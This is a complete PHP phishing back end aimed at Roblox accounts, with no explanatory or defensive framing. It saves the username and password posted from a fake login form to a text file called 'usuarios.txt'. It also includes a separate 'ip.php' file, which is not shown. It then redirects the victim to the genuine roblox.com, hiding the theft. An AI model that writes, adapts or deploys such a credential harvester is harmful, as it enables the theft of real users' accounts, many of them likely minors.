<?php
include "ip.php";
file_put_contents("usuarios.txt", "Usuario de roblox : " . $_POST['username'] . "\nContraseña: " . $_POST['password'] ."\n", FILE_APPEND);
header("Location: https://roblox.com");
exit();
?>
